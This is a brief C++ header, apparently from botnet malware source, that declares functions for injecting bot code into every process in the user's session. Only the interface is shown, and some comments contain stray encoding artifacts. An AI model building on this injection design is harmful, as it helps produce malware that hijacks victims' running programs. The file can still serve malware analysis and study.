/*
  Инжектор бота в процессы.
*/
#pragma once

namespace CoreInject
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*В В В В Inject code into all processes of the current session by the current user.

В В В В Return - true - if there was inject At least in one process
В В В В В В В В В В В В В false - unless one injection produce is not produced.
В В */
  bool _injectToAll(void);
};
